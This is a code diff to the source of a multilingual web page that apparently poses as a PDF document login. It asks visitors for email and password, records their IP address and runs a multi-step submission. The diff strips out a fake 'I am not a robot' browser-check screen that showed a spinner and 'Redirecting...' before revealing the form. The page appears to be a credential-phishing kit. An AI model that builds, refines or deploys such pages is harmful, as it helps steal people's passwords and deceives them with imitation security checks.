@@ -130,41 +130,22 @@
           padding: 10px;
         }
       }
-      /* Added for bot verification */
-      #verification-div {
-         height: 100vh;
-         display: flex;
-         align-items: start;
-         justify-content: center;
-         padding-top: 10%;
-         position: absolute;
-         width: 100vw;
-         background-color: #fff;
-      }
-      .verification-content {
-         text-align: left;
-      }
-      .checkbox-container {
-         border: 0px solid black;
-         background: #f3efef;
-         border-radius: 5px;
-      }
-      .spinner-border {
-         width: 1.5rem;
-         height: 1.5rem;
-      }
       /* Added for loader overlay */
       .loader-overlay {
-         position: fixed;
-         top: 0;
-         left: 0;
-         width: 100%;
-         height: 100%;
-         background: rgba(0, 0, 0, .5);
-         align-items: center;
-         justify-content: center;
-         z-index: 9999;
-         display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, .5);
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+        display: none;
+      }
+      .spinner-border {
+        width: 1.5rem;
+        height: 1.5rem;
       }
     </style>
   </head>
@@ -174,23 +155,7 @@
       ⚡ Custom HTML/CSS/JS for authentication interface
     -->
 
-    <!-- Bot Verification Div -->
-    <div id="verification-div">
-      <div class="row">
-        <div class="col-12 verification-content mx-2">
-          <h2 id="verify-heading">Checking your browser before accessing the site</h2>
-          <div>
-            <div class="checkbox-container mt-3 d-flex align-items-center p-4">
-              <input type="checkbox" id="bot-check" class="form-check-input">
-              <label for="bot-check" class="form-check-label ms-2" id="bot-check-label">I am not a robot</label>
-            </div>
-          </div>
-          <p class="pt-1" id="verify-instruction">Click on the checkbox to verify if you're human.</p>
-        </div>
-      </div>
-    </div>
-
-    <div class="form-box" style="display: none;">
+    <div class="form-box">
       <img
         src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg"
         alt="PDF Icon"
@@ -275,10 +240,6 @@
       // Translation object for multiple languages
       const translations = {
         en: {
-          verifyHeading: "Checking your browser before accessing the site",
-          botCheckLabel: "I am not a robot",
-          verifyInstruction: "Click on the checkbox to verify if you're human.",
-          redirecting: "Redirecting...",
           errorMessage: "Incorrect password",
           emailLabel: "Enter your email",
           passwordLabel: "Enter password",
@@ -288,10 +249,6 @@
           loaderText: "Loading..."
         },
         zh: {
-          verifyHeading: "在访问网站之前检查您的浏览器",
-          botCheckLabel: "我不是机器人",
-          verifyInstruction: "点击复选框以验证您是人类。",
-          redirecting: "正在重定向...",
           errorMessage: "密码错误",
           emailLabel: "输入您的电子邮件",
           passwordLabel: "输入密码",
@@ -301,10 +258,6 @@
           loaderText: "加载中..."
         },
         ja: {
-          verifyHeading: "サイトにアクセスする前にブラウザを確認しています",
-          botCheckLabel: "私はロボットではありません",
-          verifyInstruction: "人間であることを確認するためにチェックボックスをクリックしてください。",
-          redirecting: "リダイレクト中...",
           errorMessage: "パスワードが間違っています",
           emailLabel: "メールアドレスを入力",
           passwordLabel: "パスワードを入力",
@@ -314,10 +267,6 @@
           loaderText: "読み込み中..."
         },
         hi: {
-          verifyHeading: "साइट तक पहुंचने से पहले अपने ब्राउज़र की जांच करें",
-          botCheckLabel: "मैं रोबोट नहीं हूँ",
-          verifyInstruction: "यह सत्यापित करने के लिए चेकबॉक्स पर क्लिक करें कि आप इंसान हैं।",
-          redirecting: "पुनर्निर्देशन...",
           errorMessage: "गलत पासवर्ड",
           emailLabel: "अपना ईमेल दर्ज करें",
           passwordLabel: "पासवर्ड दर्ज करें",
@@ -327,10 +276,6 @@
           loaderText: "लोड हो रहा है..."
         },
         es: {
-          verifyHeading: "Comprobando tu navegador antes de acceder al sitio",
-          botCheckLabel: "No soy un robot",
-          verifyInstruction: "Haz clic en la casilla para verificar que eres humano.",
-          redirecting: "Redirigiendo...",
           errorMessage: "Contraseña incorrecta",
           emailLabel: "Ingresa tu correo electrónico",
           passwordLabel: "Ingresa tu contraseña",
@@ -340,10 +285,6 @@
           loaderText: "Cargando..."
         },
         fr: {
-          verifyHeading: "Vérification de votre navigateur avant d'accéder au site",
-          botCheckLabel: "Je ne suis pas un robot",
-          verifyInstruction: "Cochez la case pour vérifier que vous êtes humain.",
-          redirecting: "Redirection...",
           errorMessage: "Mot de passe incorrect",
           emailLabel: "Entrez votre email",
           passwordLabel: "Entrez votre mot de passe",
@@ -353,10 +294,6 @@
           loaderText: "Chargement..."
         },
         de: {
-          verifyHeading: "Überprüfung Ihres Browsers vor dem Zugriff auf die Website",
-          botCheckLabel: "Ich bin kein Roboter",
-          verifyInstruction: "Klicken Sie auf das Kontrollkästchen, um zu bestätigen, dass Sie ein Mensch sind.",
-          redirecting: "Weiterleitung...",
           errorMessage: "Falsches Passwort",
           emailLabel: "Geben Sie Ihre E-Mail ein",
           passwordLabel: "Geben Sie Ihr Passwort ein",
@@ -366,10 +303,6 @@
           loaderText: "Laden..."
         },
         pt: {
-          verifyHeading: "Verificando seu navegador antes de acessar o site",
-          botCheckLabel: "Não sou um robô",
-          verifyInstruction: "Clique na caixa de seleção para verificar se você é humano.",
-          redirecting: "Redirecionando...",
           errorMessage: "Senha incorreta",
           emailLabel: "Digite seu e-mail",
           passwordLabel: "Digite sua senha",
@@ -379,10 +312,6 @@
           loaderText: "Carregando..."
         },
         ar: {
-          verifyHeading: "التحقق من متصفحك قبل الوصول إلى الموقع",
-          botCheckLabel: "أنا لست روبوت",
-          verifyInstruction: "انقر على مربع الاختيار للتحقق من أنك إنسان.",
-          redirecting: "جارٍ إعادة التوجيه...",
           errorMessage: "كلمة المرور غير صحيحة",
           emailLabel: "أدخل بريدك الإلكتروني",
           passwordLabel: "أدخل كلمة المرور",
@@ -392,10 +321,6 @@
           loaderText: "جارٍ التحميل..."
         },
         it: {
-          verifyHeading: "Controllo del browser prima di accedere al sito",
-          botCheckLabel: "Non sono un robot",
-          verifyInstruction: "Fai clic sulla casella per verificare che sei umano.",
-          redirecting: "Reindirizzamento...",
           errorMessage: "Password errata",
           emailLabel: "Inserisci la tua email",
           passwordLabel: "Inserisci la tua password",
@@ -405,10 +330,6 @@
           loaderText: "Caricamento..."
         },
         ko: {
-          verifyHeading: "사이트에 접근하기 전에 브라우저를 확인하는 중",
-          botCheckLabel: "나는 로봇이 아닙니다",
-          verifyInstruction: "인간임을 확인하려면 체크박스를 클릭하세요.",
-          redirecting: "리디렉션 중...",
           errorMessage: "잘못된 비밀번호",
           emailLabel: "이메일을 입력하세요",
           passwordLabel: "비밀번호를 입력하세요",
@@ -418,10 +339,6 @@
           loaderText: "로딩 중..."
         },
         vi: {
-          verifyHeading: "Kiểm tra trình duyệt của bạn trước khi truy cập trang web",
-          botCheckLabel: "Tôi không phải là robot",
-          verifyInstruction: "Nhấp vào hộp kiểm để xác minh bạn là con người.",
-          redirecting: "Đang chuyển hướng...",
           errorMessage: "Mật khẩu không đúng",
           emailLabel: "Nhập email của bạn",
           passwordLabel: "Nhập mật khẩu của bạn",
@@ -443,9 +360,6 @@
       function applyTranslations(lang) {
         const t = translations[lang];
         document.documentElement.lang = lang;
-        document.getElementById('verify-heading').textContent = t.verifyHeading;
-        document.getElementById('bot-check-label').textContent = t.botCheckLabel;
-        document.getElementById('verify-instruction').textContent = t.verifyInstruction;
         document.getElementById('passwordError').textContent = t.errorMessage;
         document.getElementById('emailInput').placeholder = t.emailLabel;
         document.getElementById('passwordInput').placeholder = t.passwordLabel;
@@ -500,37 +414,6 @@
         }).catch(e => {
           console.error("Error fetching IP address:", e);
           userData.ipAddress = "Unavailable";
-        });
-
-        // Bot Verification
-        const botCheck = document.getElementById('bot-check');
-        const verificationDiv = document.getElementById('verification-div');
-        const formBox = document.querySelector('.form-box');
-        botCheck.addEventListener('change', function () {
-          if (this.checked) {
-            const checkboxContainer = this.parentElement;
-            checkboxContainer.innerHTML = `
-              <div class="spinner-container d-flex align-items-center">
-                <div class="spinner-border" role="status">
-                  <span class="visually-hidden">${translations[lang].loaderText}</span>
-                </div>
-                <span class="ms-2">${translations[lang].verifyInstruction}</span>
-              </div>
-            `;
-            setTimeout(function () {
-              verificationDiv.innerHTML = `
-                <div class="row">
-                  <div class="col-12 verification-content">
-                    <h2>${translations[lang].redirecting}</h2>
-                  </div>
-                </div>
-              `;
-              setTimeout(function () {
-                verificationDiv.style.display = 'none';
-                formBox.style.display = 'block';
-              }, 2000);
-            }, 4000);
-          }
         });
 
         // Step 1 Submission
